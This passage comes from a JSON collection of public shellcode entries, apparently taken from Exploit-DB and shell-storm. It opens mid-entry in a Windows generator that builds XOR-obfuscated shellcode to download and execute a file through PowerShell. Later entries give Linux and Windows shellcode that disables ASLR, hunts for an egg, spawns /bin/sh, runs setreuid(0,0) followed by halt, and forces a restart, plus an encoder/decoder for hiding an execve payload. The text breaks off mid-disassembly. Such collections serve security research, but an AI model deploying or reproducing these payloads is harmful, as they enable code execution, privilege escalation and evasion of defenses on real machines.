\"\\x31\\xc0\\x50\\x68\\x41\\x41\\x65\\x22\\x58\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb8\\x34\\x47\\x0b\\x4d\\xbb\\x5d\\x69\\x6e\\x35\\x31\\xd8\\x50\\xb8\\x43\\x32\\x10\\x22\\xbb\\x79\\x6e\\x51\\x4e\\x31\\xd8\\x50\\xb8\\x60\\x05\\x42\\x32\\xbb\\x49\\x78\\x79\\x71\\x31\\xd8\\x50\\xb8\\x0f\\x1c\\x2c\\x14\\xbb\\x6a\\x64\\x49\\x33\\x31\\xd8\\x50\\xb8\\x07\\x3e\\x0b\\x40\\xbb\\x46\\x52\\x62\\x6e\\x31\\xd8\\x50\\xb8\\x44\\x0a\\x78\\x07\\xbb\\x63\\x49\\x42\\x5b\\x31\\xd8\\x50\\xb8\\x0f\\x16\\x4b\\x0d\\xbb\\x6a\\x31\\x67\\x2d\\x31\\xd8\\x50\\xb8\\x18\\x62\\x5c\\x1f\\xbb\\x61\\x4c\\x39\\x67\\x31\\xd8\\x50\\xb8\\x1b\\x2d\\x1e\\x1f\\xbb\\x6b\\x58\\x6a\\x6b\\x31\\xd8\\x50\\xb8\\x45\\x40\\x41\\x66\\xbb\\x3d\\x78\\x77\\x49\\x31\\xd8\\x50\\xb8\\x02\\x1f\\x4b\\x45\\xbb\\x6d\\x6b\\x38\\x6a\\x31\\xd8\\x50\\xb8\\x24\\x3e\\x19\\x32\\xbb\\x45\\x4e\\x6a\\x5a\\x31\\xd8\\x50\\xb8\\x00\\x5e\\x3a\\x35\\xbb\\x6c\\x73\\x49\\x5b\\x31\\xd8\\x50\\xb8\\x1f\\x37\\x40\\x24\\xbb\\x6d\\x52\\x32\\x41\\x31\\xd8\\x50\\xb8\\x2e\\x35\\x68\\x31\\xbb\\x5a\\x4c\\x45\\x41\\x31\\xd8\\x50\\xb8\\x48\\x1e\\x1c\\x15\\xbb\\x67\\x6e\\x69\\x61\\x31\\xd8\\x50\\xb8\\x26\\x28\\x0d\\x5d\\xbb\\x4f\\x45\\x62\\x33\\x31\\xd8\\x50\\xb8\\x20\\x57\\x1d\\x45\\xbb\\x47\\x78\\x63\\x36\\x31\\xd8\\x50\\xb8\\x04\\x6a\\x24\\x3b\\xbb\\x77\\x44\\x4b\\x49\\x31\\xd8\\x50\\xb8\\x18\\x0f\\x0a\\x32\\xbb\\x6c\\x6e\\x78\\x47\\x31\\xd8\\x50\\xb8\\x7d\\x18\\x3c\\x27\\xbb\\x52\\x6c\\x5d\\x55\\x31\\xd8\\x50\\xb8\\x03\\x44\\x60\\x60\\xbb\\x77\\x34\\x5a\\x4f\\x31\\xd8\\x50\\xb8\\x47\\x6b\\x1f\\x20\\xbb\\x6f\\x4c\\x77\\x54\\x31\\xd8\\x50\\xb8\\x2a\\x5e\\x2b\\x20\\xbb\\x6c\\x37\\x47\\x45\\x31\\xd8\\x50\\xb8\\x59\\x07\\x12\\x0e\\xbb\\x35\\x68\\x73\\x6a\\x31\\xd8\\x50\\xb8\\x01\\x59\\x11\\x2c\\xbb\\x45\\x36\\x66\\x42\\x31\\xd8\\x50\\xb8\\x22\\x22\\x4e\\x5a\\xbb\\x4c\\x56\\x67\\x74\\x31\\xd8\\x50\\xb8\\x00\\x37\\x1b\\x48\\xbb\\x43\\x5b\\x72\\x2d\\x31\\xd8\\x50\\xb8\\x4a\\x1f\\x22\\x13\\xbb\\x64\\x48\\x47\\x71\\x31\\xd8\\x50\\xb8\\x6a\\x23\\x03\\x18\\xbb\\x4a\\x6d\\x66\\x6c\\x31\\xd8\\x50\\xb8\\x2d\\x54\\x57\\x1c\\xbb\\x47\\x31\\x34\\x68\\x31\\xd8\\x50\\xb8\\x4e\\x15\\x36\\x5a\\xbb\\x39\\x38\\x79\\x38\\x31\\xd8\\x50\\xb8\\x59\\x7f\\x1f\\x04\\xbb\\x79\\x57\\x51\\x61\\x31\\xd8\\x50\\xb8\\x47\\x56\\x1d\\x2f\\xbb\\x65\\x70\\x3d\\x54\\x31\\xd8\\x50\\xb8\\x2c\\x18\\x08\\x54\\xbb\\x4d\\x76\\x6c\\x74\\x31\\xd8\\x50\\xb8\\x5a\\x34\\x58\\x1b\\xbb\\x39\\x5b\\x35\\x76\\x31\\xd8\\x50\\xb8\\x3f\\x0f\\x4b\\x41\\xbb\\x53\\x63\\x6b\\x6c\\x31\\xd8\\x50\\xb8\\x4a\\x1e\\x59\\x0b\\xbb\\x38\\x6d\\x31\\x6e\\x31\\xd8\\x50\\xb8\\x49\\x2b\\x16\\x2a\\xbb\\x39\\x44\\x61\\x4f\\x31\\xd8\\x50\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\x95\\xe6\\xb1\\x77\\xff\\xd3\\xbb\\xcf\\x2a\\xae\\x77\\xff\\xd3\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}", "=======================================", "C:\\Users\\Ali\\Desktop>gcc shellcode.c -o shellcode.exe", "C:\\Users\\Ali\\Desktop>shellcode.exe", "Length: 173", "C:\\Users\\Ali\\Desktop>", "#notice : when program exit, you must wait 2-3 second , it will finish download and execute file after 2-3 second ", "'''", "import random,binascii", "chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789=[]-'", "p1 = '''xor eax,eax", "push eax ", "'''", "p2 = '''", "mov eax,esp", "mov ebx,0x01414141", "shr ebx,0x08", "shr ebx,0x08", "shr ebx,0x08", "push ebx", "push eax", "mov ebx,0x77b1e695", "call ebx", "mov ebx,0x77ae2acf", "call ebx", "'''", "sen1 = str(raw_input('Enter url\\nExample: http://z3r0d4y.com/file.exe \\nEnter:'))", "sen1 = sen1.rsplit()", "sen1 = sen1[0]", "sen2 = str(raw_input('Enter filename\\nExample: D:\\\\file.exe\\nEnter:'))", "sen2 = sen2.rsplit()", "sen2 = sen2[0]", "sen = '''powershell -command \"& { (New-Object Net.WebClient).DownloadFile('%s', '%s')};%s\"''' %(sen1,sen2,sen2)", "m = 0", "for word in sen:", "        m += 1", "m = m - 1", "stack = ''", "while(m>=0):", "        stack += sen[m]", "        m -= 1", "stack = stack.encode('hex')", "skip = 1", "if len(stack) % 8 == 0:", "        skip = 0", "if skip is 1:", "        stack = '00' + stack", "        if len(stack) % 8 == 0:", "                skip = 0", "        if skip is 1:", "                stack = '00' + stack", "                if len(stack) % 8 == 0:", "                        skip = 0", "        if skip is 1:", "                stack = '00' + stack", "                if len(stack) % 8 == 0:", "                        skip = 0", "if len(stack) % 8 == 0:", "        zxzxzxz = 0", "m = len(stack) / 8", "c = 0", "n = 0", "z = 8", "shf = open('shellcode.asm','w')", "shf.write(p1)", "shf.close()", "shf = open('shellcode.asm','a')", "while(c<m):", "        v = 'push 0x' + stack[n:z]", "        skip = 0", "        if '0x000000' in v:", "                skip = 1", "                q1 = v[13:]", "                v = 'push 0x' + q1 + '414141' + '\\n' + 'pop eax\\nshr eax,0x08\\nshr eax,0x08\\nshr eax,0x08\\npush eax\\n'", "        if '0x0000' in v:", "                skip = 1", "                q1 = v[11:]", "                v = 'push 0x' + q1 + '4141' + '\\n' + 'pop eax\\nshr eax,0x08\\nshr eax,0x08\\npush eax\\n'", "        if '0x00' in v:", "                skip = 1", "                q1 = v[9:]", "                v = 'push 0x' + q1 + '41' + '\\n' + 'pop eax\\nshr eax,0x08\\npush eax\\n'", "        if skip is 1:", "                shf.write(v)", "        if skip is 0:", "                v = v.rsplit()", "                zzz = ''", "                for w in v:", "                        if '0x' in w:", "                                zzz = str(w)", "                s1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))", "                s1 = '0x%s'%s1", "                data = \"%x\" % (int(zzz, 16) ^ int(s1, 16))", "                v =  'mov eax,0x%s\\nmov ebx,%s\\nxor eax,ebx\\npush eax\\n'%(data,s1)", "                shf.write(v)", "        n += 8", "        z += 8", "        c += 1", "shf.write(p2)", "shf.close()"]},
{"Title": "Linux/x86 - Disable ASLR Security Shellcode (84 bytes)", "Author": "Mohammad Reza Ramezani", "Published": ": 2015-04-03", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36637.c", "View": "https://old.exploit-db.com/raw/36637/", "code": ["/*", "#Title: Disable ASLR in Linux (less byte and more compact)", "#Length: 84 bytes", "#Date: 3 April 2015", "#Author: Mohammad Reza  Ramezani (mr.ramezani.edu@gmail.com - g+) ", "#Tested On: kali-linux-1.0.6-i386", "", "Thanks to stackoverflow", "", "", "", "section .text", "global _start", "", "_start:", "", "jmp short fileaddress", "shellcode:", "pop ebx", "xor eax,eax", "mov byte [ebx + 35],al", "push byte 5", "pop eax", "push byte 2", "pop ecx", "int 80h", "", "mov ebx, eax", "push byte 4", "pop eax", "jmp short output", "cont:", "pop ecx", "push byte 2", "pop edx", "int 80h", "", "push byte 1", "pop eax", "xor ebx, ebx", "int 80h", "", "fileaddress:", "call shellcode", "db '/proc/sys/kernel/randomize_va_spaceX'", "", "output:", "call cont", "db '0',10", "*/", "", "char shellcode[] = \"\\xeb\\x22\\x5b\\x31\\xc0\\x88\\x43\\x23\\x6a\\x05\\x58\"", "\"\\x6a\\x02\\x59\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\xeb\\x36\\x59\\x6a\\x02\\x5a\u0094", "\u0093\\xcd\\x80\\x6a\\x01\\x58\\x31\\xdb\\xcd\\x80\\xe8\\xd9\\xff\\xff\\xff\\x2f\\x70\u0094", "\u0093\\x72\\x6f\\x63\\x2f\\x73\\x79\\x73\\x2f\\x6b\\x65\\x72\\x6e\\x65\\x6c\\x2f\\x72\u0094", "\u0093\\x61\\x6e\\x64\\x6f\\x6d\\x69\\x7a\\x65\\x5f\\x76\\x61\\x5f\\x73\\x70\\x61\\x63\u0094", "\u0093\\x65\\x58\\xe8\\xc5\\xff\\xff\\xff\\x30\\x0a\";", "", "int main()", "{", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - Egghunter (0x5159) Shellcode (20 bytes)", "Author": "Paw Petersen", "Published": ": 2015-04-08", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36672.asm", "View": "https://old.exploit-db.com/raw/36672/", "code": ["; Egg Hunter (20 bytes)", ";   - searches from current addr towards lower memory", ";   - marker: 0x5159 (push ecx,pop ecx)", "; Paw Petersen, SLAE-656", "; https://www.pawpetersen.dk/slae-assignment-3-egg-hunter-linux-x86/", "", "global _start", "section .text", "_start:", "  jmp     call_egghunter", "egghunter:", "  pop     ecx                 ; save addr ptr", "  sub     ecx, 23             ; move addr ptr back", "next:", "  cmp     word [ecx], 0x5951  ; marker", "  loopnz  next                ; dec ecx, jump", "  jmp ecx                     ; jump to shellcode", "call_egghunter:", "  call    egghunter", "", "", "; \"\\xeb\\x0d\\x59\\x83\\xe9\\x17\\x66\\x81\\x39\\x51\\x59\\xe0\"", "; \u201d\\xf9\\xff\\xe1\\xe8\\xee\\xff\\xff\\xff\""]},
{"Title": "Linux/x86 - Create 'my.txt' In Working Directory Shellcode (37 bytes)", "Author": "Mohammad Reza Ramezani", "Published": ": 2015-04-10", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36701.c", "View": "https://old.exploit-db.com/raw/36701/", "code": ["/*", "#Title: Create 'my.txt' in present working directory of vulnerable software", "#Length: 37 bytes", "#Date: 3 April 2015", "#Author: Mohammad Reza  Ramezani (mr.ramezani.edu [at] gmail com - g+) ", "#Tested On: kali-linux-1.0.6-i386", "", "", "", "", "Section   .text", "global _start", "", "_start:", "push byte 8", "pop eax", "jmp short GoToCall", "shellcode:", "pop ebx", "xor edx, edx", "mov [ebx + 6], dl", "push word 0544o", "pop ecx", "int 0x80", "", "push byte 1", "pop eax", "xor ebx, ebx", "int 0x80", "", "", "GoToCall:", "call shellcode", "db 'my.txtX'", "", "", "This shellcode can generalized by using of absolute path instead of 'my.txt'", "*/", "", "char shellcode[] = \"\\x6a\\x08\\x58\\xeb\\x14\\x5b\\x31\\xd2\"", "\"\\x88\\x53\\x06\\x66\\x68\\x64\\x01\\x59\\xcd\\x80\\x6a\\x01\\x58\"", "\"\\x31\\xdb\\xcd\\x80\\xe8\\xe7\\xff\\xff\\xff\\x6d\\x79\\x2e\\x74\"", "\"\\x78\\x74\\x58\";", "", "int main()", "{", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int)shellcode;", "}", "", "", "int main()", "{", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - setreuid(0, 0) + execve(/sbin/halt) + exit(0) Shellcode (49 bytes)", "Author": "Febriyanto Nugroho", "Published": ": 2015-04-14", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36750.c", "View": "https://old.exploit-db.com/raw/36750/", "code": ["/*", "", "+========================================================================================", "| # Exploit Title  : linux/x86 setreuid(0, 0) + execve(\"/sbin/halt\") + exit(0) - 49 bytes", "| # Exploit Author : Febriyanto Nugroho", "| # Tested on      : Linux Debian 5.0.5                               ", "+========================================================================================", "", " */", "", "#include <stdio.h>", "#include <string.h>", "", "char s[] = \"\\x31\\xc0\\x31\\xdb\\x50\\x53\\x89\\xe1\"", "           \"\\xb0\\x46\\xcd\\x80\\x31\\xc0\\x50\\x68\"", "           \"\\x68\\x61\\x6c\\x74\\x68\\x6e\\x2f\\x2f\"", "           \"\\x2f\\x68\\x2f\\x73\\x62\\x69\\x89\\xe3\"", "           \"\\x50\\x53\\xb0\\x0b\\x89\\xe1\\xcd\\x80\"", "           \"\\x31\\xc0\\x50\\x89\\xe3\\xb0\\x01\\xcd\"", "           \"\\x80\";", "", "int main(int argc, char *argv[]) {", "printf(\"shellcode length -> %d bytes\\n\", strlen(s));", "int(*fuck)() = (int(*)())s;", "fuck();", "return 0;", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (35 bytes)", "Author": "Mohammad Reza Espargham", "Published": ": 2015-04-17", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36778.c", "View": "https://old.exploit-db.com/raw/36778/", "code": ["/*", "; Title: Linux/x86 execve \"/bin/sh\" - shellcode 35 bytes", "; Platform: linux/x86_64", "; Date: 2014-06-26", "; Author: Mohammad Reza Espargham", "; Simple ShellCode", "", "section .text:", "", "08048060 <_start>:", "  8048060:    eb 17                    jmp    8048079", "", "08048062 :", "  8048062:    5e                       pop    %esi", "  8048063:    31 d2                    xor    %edx,%edx", "  8048065:    52                       push   %edx", "  8048066:    56                       push   %esi", "  8048067:    89 e1                    mov    %esp,%ecx", "  8048069:    89 f3                    mov    %esi,%ebx", "  804806b:    31 c0                    xor    %eax,%eax", "  804806d:    b0 0b                    mov    $0xb,%al", "  804806f:    cd 80                    int    $0x80", "  8048071:    31 db                    xor    %ebx,%ebx", "  8048073:    31 c0                    xor    %eax,%eax", "  8048075:    40                       inc    %eax", "  8048076:    cd 80                    int    $0x80", "", "08048078 :", "  8048078:    e8 e5 ff ff ff           call   8048062", "  804807d:    2f                       das", "  804807e:    62 69 6e                 bound  %ebp,0x6e(%ecx)", "  8048081:    2f                       das", "  8048082:    73 68                    jae    80480ec", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "#include <sys/mman.h>", "", "#define PAGE_SIZE 4096U", "", "", "char code[] = {", "     \"\\xeb\\x16\\x5e\\x31\\xd2\\x52\\x56\\x89\\xe1\\x89\\xf3\\x31\\xc0\\xb0\\x0b\\xcd\"", "     \"\\x80\\x31\\xdb\\x31\\xc0\\x40\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x62\\x69\"", "     \"\\x6e\\x2f\\x73\\x68\"", "};", "", "int", "main() {", "", "printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "int (*ret)() = (int(*)())code;", "ret();", "", "return 0;", "}"]},
{"Title": "Windows/x86 (XP SP3) - Create (file.txt) Shellcode (83 bytes)", "Author": "TUNISIAN CYBER", "Published": ": 2015-04-17", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/36779.c", "View": "https://old.exploit-db.com/raw/36779/", "code": ["/*", "#[+] Author: TUNISIAN CYBER", "#[+] Title: Shellcode: win32/xp sp3 Create (\"file.txt\") (83 bytes)", "#[+] Date: 15-04-2015", "#[+] Type: Local Exploits", "#[+] Tested on: WinXp 32bit SP3", "#[+] Friendly Sites: sec4ever.com", "#[+] Twitter: @TCYB3R", "#[+] Credits: steve hanna", "              projectshellcode.com", "=============================", "Assembly:", "", ";create.asm", "[Section .text]", "", "BITS 32", "", "global _start", "", "_start:", "", "jmp short GetCommand ", "CommandReturn: ", "    pop ebx", "", "    xor eax,eax ", "    push eax ", "    push ebx ", "    mov ebx,0x7c8623ad", "    call ebx ", "", "    xor eax,eax", "    push eax", "    mov ebx, 0x7c81cafa", "    call ebx", "", "GetCommand:", "    call CommandReturn", "    db \"cmd.exe /C echo shellcode by tunisian cyber >file.txt\"", "    db 0x00", "=============================", "*/", "char shellcode[] =  \"\\xeb\\x16\\x5b\\x31\\xc0\\x50\\x53\\xbb\\xad\\x23\\x86\\x7c\\xff\"", "                    \"\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3\\xe8\\xe5\\xff\\xff\\xff\\x63\\x6d\\x64\\x2e\\x65\\x78\"", "                    \"\\x65\\x20\\x2f\\x43\\x20\\x65\\x63\\x68\\x6f\\x20\\x73\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\\x62\\x79\"", "                    \"\\x20\\x74\\x75\\x6e\\x69\\x73\\x69\\x61\\x6e\\x20\\x63\\x79\\x62\\x65\\x72\\x20\\x3e\\x66\\x69\\x6c\\x65\\x2e\\x74\\x78\\x74\\x00\";", "", "  ", "int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}"]},
{"Title": "Windows/x86 (XP SP3) - Restart Shellcode (57 bytes)", "Author": "TUNISIAN CYBER", "Published": ": 2015-04-17", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/36780.c", "View": "https://old.exploit-db.com/raw/36780/", "code": ["/*", "#[+] Author: TUNISIAN CYBER", "#[+] Title: Shellcode: win32/xp sp3 Restart computer", "#[+] Date: 16-04-2015", "#[+] Type: Local Exploits", "#[+] Tested on: WinXp 32bit SP3", "#[+] Friendly Sites: sec4ever.com", "#[+] Twitter: @TCYB3R", "#[+] Credits: steve hanna", "              projectshellcode.com", "=============================", "Assembly:", "", ";create.asm", "[Section .text]", "", "BITS 32", "", "global _start", "", "_start:", "", "jmp short GetCommand ", "CommandReturn: ", "    pop ebx", "", "    xor eax,eax ", "    push eax ", "    push ebx ", "    mov ebx,0x7c8623ad", "    call ebx ", "", "    xor eax,eax", "    push eax", "    mov ebx, 0x7c81cafa", "    call ebx", "", "GetCommand:", "    call CommandReturn", "    db \"cmd.exe /C shutdown /r /t 0\"", "    db 0x00", "=============================", "*/", "char shellcode[] = \"\\xeb\\x16\\x5b\\x31\\xc0\\x50\\x53\\xbb\\xad\\x23\\x86\\x7c\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\"", "\"\\x81\\x7c\\xff\\xd3\\xe8\\xe5\\xff\\xff\\xff\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x43\\x20\"", "\"\\x73\\x68\\x75\\x74\\x64\\x6f\\x77\\x6e\\x20\\x2f\\x72\\x20\\x2f\\x74\\x20\\x30\\x00\";", "", "", "  ", "int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}"]},
{"Title": "Linux/x86 - 'Followtheleader' Custom execve() Shellcode (Encoder/Decoder) (Generator)", "Author": "Konstantinos Alexiou", "Published": ": 2015-04-17", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-902.php", "View": null, "code": ["/*", "Followtheleader custom execve-shellcode Encoder/Decoder  - Linux Intel/x86", "Author: Konstantinos Alexiou", "*/", "------------------------------------------------------------------------------------------------------------------", "a)Python script. Encoder for shellcode (execve)", "------------------------------------------------------------------------------------------------------------------", "", "#!/usr/bin/python", "# Author:Konstantinos Alexiou  ", "# Encoding name: Followtheleader-encoder", "# Description: Custom execve-shellcode encoder based on a given byte which is used to encode the execve shellcode", "import random", "import sys", "shellcode =('\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80')", "", "total = len(sys.argv)", "if total != 2:", "\tprint '!!Give the LEADER byte' ", "\tprint 'Script must run as: python xxx.py LEADER'", "\tprint 'LEADER is any integer between 17-255'", "\tprint 'e.g  python Followtheleader.py 32'", "else:", "    try:", "\tleader = int(sys.argv[1])", "\tfb = int(hex(leader)[2:3],16)\t\t                          # Split the LEADER. If leader = AF -->fb=A", "\tsb = int(hex(leader)[3:],16)\t\t\t\t          # Split the LEADER. If LEADER = AF -->sb=F", "\tencoded = ' '", "\tencoded2 = ' ' ", "\tencoded = '\\\\x'", "\tencoded += hex(leader)[2:]     \t    \t        \t\t  # FIRST byte the LEADER ", "\tencoded2 = '0x'", "\tencoded2 += hex(leader)[2:]", "\ti=0", "\tfor x in bytearray(shellcode):          \t                  # READ every Instruction as BYTE  ", "\t\ti +=1", "\t\thopcode = '%02x' %x\t\t             \t          # KEEP only the HEX value of opcode", "\t\tDec_hopcode = int(hopcode, 16)\t\t      \t          # CALCULATE the DECIMAL value of opcode ", "\t\tsuplX = 255 - Dec_hopcode       \t\t          # CALCULATE the SUPPLEMENT ", "\t\trev_suplx = hex(suplX)[::-1]                              # REVERT the bytes of SUPPLEMENT (ae --> ea)", "\t\tsubfs = fb-sb                        ", "#----------------------------The Encoded byte ----------------------------------------------------", "   \t\txxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))", "#-------------------------------------------------------------------------------------------------", "\t\tif len(xxx)>4:\t\t\t\t \t          # Check if xxx > 0xff", "\t\t\tprint 'Overflow encoding.Try again!!!.'", "\t\t\tsys.exit()", "\t\telif xxx == '0x0':\t\t\t\t\t  # Check if ZERO byte was encoded ", "\t    \t\tprint 'A byte was Encoded as 0x00 .Try again!!!'", "            \t\tsys.exit()", "\t\tencoded +=  '\\\\x'           \t\t\t          # Put \\x first", "\t\tencoded +=  xxx[2:]         \t\t\t          # Put the xxx afterwards", "\t\tinsertByte = hex(random.randint(1,255))    \t          # Put a Random byte ", "\t\tencoded += '\\\\x'            ", "\t\tencoded += insertByte[2:]   ", "\t\ti +=1", "\t\tencoded2 += ','", "\t\tencoded2 += xxx ", "\t\tencoded2 += ','           ", "\t\tencoded2 += '0x'", "\t\tencoded2 += insertByte[2:]", "\tprint ' *************';", "\tprint ' LEADER BYTE :decimal(%d), HEX(0x%x)'  %(int(sys.argv[1]),leader)", "\tprint ' *************';", "\tprint 'Len of Shellcode: %02d' % i", "\tprint '------------------------------------------------------------------------';", "\tprint '   1. Style:= %s ' % encoded", "\tprint '------------------------------------------------------------------------';", "\tprint '   2. Style:= %s ' % encoded2", "\tprint '------------------------------------------------------------------------';", "    except:", "\tprint \"exiting...\"", "---------------------------------------------------------------------------------------", "", "", "Followtheleader Encoder test run :", "", "$ python Followtheleader-encoder.py 67", " *************", " LEADER BYTE :decimal(67), HEX(0x43)", " *************", "Len of Shellcode: 50", "------------------------------------------------------------------------", "   1. Style:= \\x43\\xed\\x1d\\xf4\\x40\\xfb\\x6f\\x7a\\xa9\\xe\\xb6\\xe\\xbc\\xc9\\xe3\\x7a\\xaf\\x7a\\x78", "\\xe\\xc5\\xda\\x76\\x6a\\x17\\x1a\\x4e\\x68\\x38\\xc2\\x99\\xfb\\x35\\x68\\x84\\xd2\\xb3\\xcb\\x7c\\x68\\x78", "\\xe2\\x9a\\xf5\\xe9\\x50\\xc0\\x24\\x91\\xf8\\xfe ", "------------------------------------------------------------------------", "   2. Style:= 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,", "0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,", "0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe ", "------------------------------------------------------------------------", "", "", "b) Decoder for the encoded shellcode (execve-stack)", "---------------------------------------------------------------------------------------", "$ cat Followtheleader-decoder.nasm ", "; Filename: Followtheleader-decoder.nasm", "; Author:  Konstantinos Alexiou", "; Description: Followtheleader custom insertion Encoder, Linux Intel/x86", " ", "global _start           ", "section .text", " ", "_start:", "    jmp short call_shellcode", "", "decoder:", "    pop esi             \t ; Address of EncodedShellcode to ESI", "    lea edi, [esi]               ; Load effective address of what is contained on EDI", "    xor ecx, ecx   \t\t ; Zero ECX", "    mul ecx \t\t\t ; This instruction will cause both EAX and EDX to become zero", "    xor ebp, ebp            \t ; Zero the value on EBP ", "    mov dl, byte [esi]           ; Put the LEADER byte to EDX (DL) ", "  ", ";(firstb - secondb) CALCULATION  ", "    mov al, dl                   ; Copy the LEADER to EAX", "  ", "    ;firstb extraction of LEADER", "    shr dl, 4                    ; Keep only the 4 high bits of LEADER to DL (if Leader=ac then DL=a) [firstb]", "   ", "    ;secondb extraction of LEADER", "    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of Leader on al", "    shr eax, 28                  ; shift right 28 of EAX (if EAX=0xc0000000 now EAX=0x0000000c) [secondb]", "    sub dl, al                   ; (firstb - secondb) value stored to EDX (DL)", "    jns decode_pr    ", "", "negative:\t\t\t ; Calculate the absolute value if negative  ", "    not dl", "    inc dl", "", ";decode process", "decode_pr:", "", "    xor eax, eax                ", "    xor ebx, ebx", "    xor ecx, ecx", "", "    mov al, byte [esi+1+ebp]\t ; Put the encoded byte to EAX", "    mov ecx, ebp         \t ; EBP is used as a counter copy the value of EBP to ECX", "    xor cl, 0x32\t         ; At the end of the shellcode EBP should point 50 in decimal 32 in hex", "    je short EncodedShellcode   ", "  ", "    ;rev_suplx Calculation", "    mov cl, al\t\t\t ; Put the Encoded byte to EAX (xxx to EAX)", "    sub cl, dl          \t ; rev_suplx= xxx-(firstb - secondb) value stored to CL", "    mov bl, cl          \t ; Keep Backup of rev_suplx to BL", "    mov al, cl          \t ; Second backup of CL   ", "    ", "    ;Revert the bytes on rev_suplx ", "    shr bl, 4                    ; shift 4 bits right (if was bl=ec now bl=e)", "    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of rev_supl on cl( if EAX was 0xec now EAX=0xc0000000) ", "    shr eax, 24                  ; shift right 24 of EAX (if EAX=0xc0000000 now EAX=0x000000c0)", "    add eax, ebx                 ; add the value on EBX to EAX (if EAX=0x000000c0 + BL=0xe, EAX=0x0000000ce)", " ", "    ;Supplement Calculation", "    mov bl, 0xff                 ; Value of  0xff to BL", "    sub bl, al                   ; Calculate the Supplement", "    mov byte [edi], bl           ; Put the decoded byte to the position of EDI", "    inc edi                      ; EDI is a pointer to the position which the decoded bytes will be stored", "    add ebp,0x2\t\t\t ; The EBP is a counter values will be (2,4,6,..50)", "", "    jmp short decode_pr\t\t ; Goto the decode process to decode the next bytes\t\t", " ", "call_shellcode:", "    call decoder", "    EncodedShellcode: db 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe", "", "", "---------------------------------------------------------------------------------------------------------------------------------------", "$ objdump -d ./Followtheleader-decoder -M intel", "", "./Followtheleader-decoder:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060:\teb 4e                \tjmp    80480b0 <call_shellcode>", "", "08048062 <decoder>:", " 8048062:\t5e                   \tpop    esi", " 8048063:\t8d 3e                \tlea    edi,[esi]", " 8048065:\t31 c9                \txor    ecx,ecx", " 8048067:\tf7 e1                \tmul    ecx", " 8048069:\t31 ed                \txor    ebp,ebp", " 804806b:\t8a 16                \tmov    dl,BYTE PTR [esi]", " 804806d:\t88 d0                \tmov    al,dl", " 804806f:\tc0 ea 04             \tshr    dl,0x4", " 8048072:\tc1 e0 1c             \tshl    eax,0x1c", " 8048075:\tc1 e8 1c             \tshr    eax,0x1c", " 8048078:\t28 c2                \tsub    dl,al", " 804807a:\t79 04                \tjns    8048080 <decode_pr>", "", "0804807c <negative>:", " 804807c:\tf6 d2                \tnot    dl", " 804807e:\tfe c2                \tinc    dl", "", "08048080 <decode_pr>:", " 8048080:\t31 c0                \txor    eax,eax", " 8048082:\t31 db                \txor    ebx,ebx", " 8048084:\t31 c9                \txor    ecx,ecx", " 8048086:\t8a 44 2e 01          \tmov    al,BYTE PTR [esi+ebp*1+0x1]", " 804808a:\t89 e9                \tmov    ecx,ebp", " 804808c:\t80 f1 32             \txor    cl,0x32", " 804808f:\t74 24                \tje     80480b5 <EncodedShellcode>", " 8048091:\t88 c1                \tmov    cl,al", " 8048093:\t28 d1                \tsub    cl,dl", " 8048095:\t88 cb                \tmov    bl,cl", " 8048097:\t88 c8                \tmov    al,cl", " 8048099:\tc0 